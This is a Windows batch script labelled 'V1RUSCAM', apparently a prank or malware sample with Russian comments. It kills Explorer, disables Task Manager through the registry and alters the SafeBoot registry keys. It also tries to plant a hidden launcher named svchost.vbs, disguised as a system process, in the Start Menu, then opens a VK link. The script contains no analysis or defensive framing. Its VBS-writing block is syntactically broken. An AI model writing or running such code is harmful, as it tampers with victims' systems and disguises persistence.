@echo off
chcp 65001 > nul
mode con:cols=60 lines=10
title V1RUSCAM [ N0N 0FFICIAL ]
cls

taskkill /f /im explorer.exe >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Minimal" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Network" /t REG_SZ /d "" /f >nul 2>&1

rem Укажите путь к вашему VBS файлу
set "vbsFile=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.vbs"

rem Проверка, существует ли VBS файл
if not exist "%vbsFile%" (
    rem Запись скрипта в VBS файл
    (
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.bat", 0, False
    ) > "%vbsFile%"
) >nul 2>&1

start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.vbs" >nul 2>&1

start https://vk.com/s4ull3ss_4r3_y0u_0k4y

echo.
echo  V1RUSCAM [ N0N 0FFICIAL ]
echo.
echo  %date:~-4%%date:~-7,2%%date:~-10,2%
echo  %time:~0,2%%time:~3,2%%time:~6,2%
echo.
echo.

del %sys_inf% > nul

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 0 /f >nul 2>&1
start explorer.exe >nul 2>&1

timeout /t 3 /nobreak > nul